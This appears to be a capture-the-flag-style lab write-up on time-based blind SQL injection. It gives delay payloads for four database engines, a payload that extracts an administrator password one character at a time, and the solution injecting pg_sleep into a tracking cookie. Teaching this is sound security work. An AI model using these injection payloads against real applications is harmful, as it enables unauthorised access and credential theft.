**<h2>Background:</h2>**
As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows us to determine the truth of the injected condition based on the time taken to receive the HTTP response. 

The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:
 >   ``'; IF (1=2) WAITFOR DELAY '0:0:10'--``<br>
    ``'; IF (1=1) WAITFOR DELAY '0:0:10'--``

- The first of these inputs does not trigger a delay, because the condition 1=2 is false.
- The second input triggers a delay of 10 seconds, because the condition 1=1 is true.

Using this technique, we can retrieve data by testing one character at a time:<br>
>  ``'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--``

The following will cause an unconditional time delay of 10 seconds for given databases:
<table border=2>
<tr>
<th>Oracle</th>
<td>dbms_pipe.receive_message(('a'),10)</td>
</tr>
<tr>
<th>Microsoft</th>
<td>WAITFOR DELAY '0:0:10'</td>
</tr>
<tr>
<th>PostgreSQL</th>
<td>SELECT pg_sleep(10)</td>
</tr>
<tr>
<th>MySQL</th>
<td>SELECT SLEEP(10)</td>
</tr>
</table>
<h3>Conditional Time delays:</h3>
We can test a single boolean condition and trigger a time delay if the condition is true.
<table border=2>
<tr>
<th>Oracle</th>
<td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual</td>
</tr>
<tr>
<th>Microsoft</th>
<td>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'</td>
</tr>
<tr>
<th>PostgreSQL</th>
<td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</td>
</tr>
<tr>
<th>MySQL</th>
<td>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')</td>
</tr>
</table>


**<h2>Problem:</h2>**
The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 

**<h2>Solution:</h2>**
- From the table above add the query to the tracking id
- ``TrackingId= ....ab' || pg_sleep(10)--``